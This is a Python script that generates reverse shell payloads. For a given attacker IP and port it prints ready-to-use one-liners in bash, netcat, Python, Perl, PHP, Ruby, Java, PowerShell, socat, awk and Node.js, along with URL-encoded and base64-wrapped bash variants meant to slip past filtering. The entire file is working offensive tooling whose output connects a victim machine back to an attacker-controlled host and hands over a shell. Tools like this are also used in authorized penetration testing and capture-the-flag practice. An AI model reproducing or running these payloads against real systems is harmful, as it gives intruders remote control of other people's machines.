#!/usr/bin/env python3
"""
Reverse Shell Generator
Generates various reverse shell payloads for different languages and environments.
"""

import sys
import argparse
from urllib.parse import quote

class ReverseShellGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def bash_tcp(self):
        """Bash TCP reverse shell"""
        return f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
    
    def bash_196(self):
        """Bash 196 reverse shell"""
        return f"0<&196;exec 196<>/dev/tcp/{self.lhost}/{self.lport}; sh <&196 >&196 2>&196"
    
    def bash_5(self):
        """Bash file descriptor 5 reverse shell"""
        return f"bash -i 5<> /dev/tcp/{self.lhost}/{self.lport} 0<&5 1>&5 2>&5"
    
    def netcat_traditional(self):
        """Traditional netcat reverse shell"""
        return f"nc -e /bin/sh {self.lhost} {self.lport}"
    
    def netcat_openbsd(self):
        """OpenBSD netcat reverse shell"""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f"
    
    def python(self):
        """Python reverse shell"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    
    def python3(self):
        """Python3 reverse shell"""
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    
    def perl(self):
        """Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    
    def php_exec(self):
        """PHP exec reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    
    def php_system(self):
        """PHP system reverse shell"""
        return f"""php -r '$sock=fsockopen("{self.lhost}",{self.lport});system("/bin/sh -i <&3 >&3 2>&3");'"""
    
    def ruby(self):
        """Ruby reverse shell"""
        return f"""ruby -rsocket -e'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    
    def java(self):
        """Java reverse shell"""
        return f"""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()"""
    
    def powershell(self):
        """PowerShell reverse shell"""
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    
    def socat(self):
        """Socat reverse shell"""
        return f"socat tcp-connect:{self.lhost}:{self.lport} exec:/bin/sh,pty,stderr,setsid,sigint,sane"
    
    def awk(self):
        """AWK reverse shell"""
        return f"""awk 'BEGIN {{s = "/inet/tcp/0/{self.lhost}/{self.lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null"""
    
    def nodejs(self):
        """Node.js reverse shell"""
        return f"""(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({self.lport}, "{self.lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();"""
    
    def url_encoded_bash(self):
        """URL encoded bash reverse shell"""
        shell = self.bash_tcp()
        return quote(shell)
    
    def base64_bash(self):
        """Base64 encoded bash reverse shell"""
        import base64
        shell = self.bash_tcp()
        encoded = base64.b64encode(shell.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"
    
    def get_all_shells(self):
        """Return dictionary of all available shells"""
        return {
            "bash-tcp": self.bash_tcp(),
            "bash-196": self.bash_196(),
            "bash-5": self.bash_5(),
            "nc": self.netcat_traditional(),
            "nc-openbsd": self.netcat_openbsd(),
            "python": self.python(),
            "python3": self.python3(),
            "perl": self.perl(),
            "php-exec": self.php_exec(),
            "php-system": self.php_system(),
            "ruby": self.ruby(),
            "java": self.java(),
            "powershell": self.powershell(),
            "socat": self.socat(),
            "awk": self.awk(),
            "nodejs": self.nodejs(),
            "bash-url": self.url_encoded_bash(),
            "bash-b64": self.base64_bash()
        }

def main():
    parser = argparse.ArgumentParser(
        description="Generate reverse shell payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -l 10.10.14.5 -p 4444
  %(prog)s -l 10.10.14.5 -p 4444 -s python
  %(prog)s -l 10.10.14.5 -p 4444 -a
        """
    )
    parser.add_argument('-l', '--lhost', required=True, help='Local host IP (attacker IP)')
    parser.add_argument('-p', '--lport', required=True, help='Local port')
    parser.add_argument('-s', '--shell', help='Specific shell type to generate')
    parser.add_argument('-a', '--all', action='store_true', help='Generate all shell types')
    parser.add_argument('--list', action='store_true', help='List available shell types')
    
    args = parser.parse_args()
    
    generator = ReverseShellGenerator(args.lhost, args.lport)
    shells = generator.get_all_shells()
    
    if args.list:
        print("Available shell types:")
        for shell_type in sorted(shells.keys()):
            print(f"  - {shell_type}")
        return
    
    if args.all:
        print(f"Reverse Shells for {args.lhost}:{args.lport}\n")
        print("=" * 80)
        for shell_type, payload in shells.items():
            print(f"\n[{shell_type}]")
            print("-" * 80)
            print(payload)
            print()
    elif args.shell:
        if args.shell in shells:
            print(shells[args.shell])
        else:
            print(f"Error: Unknown shell type '{args.shell}'")
            print("Use --list to see available types")
            sys.exit(1)
    else:
        # Default: show most common shells
        common = ["bash-tcp", "python3", "nc-openbsd", "php-exec"]
        print(f"Common Reverse Shells for {args.lhost}:{args.lport}\n")
        print("=" * 80)
        for shell_type in common:
            print(f"\n[{shell_type}]")
            print("-" * 80)
            print(shells[shell_type])
        print("\n" + "=" * 80)
        print("Use -a to see all shells, --list to list types, or -s <type> for specific shell")

if __name__ == "__main__":
    main()
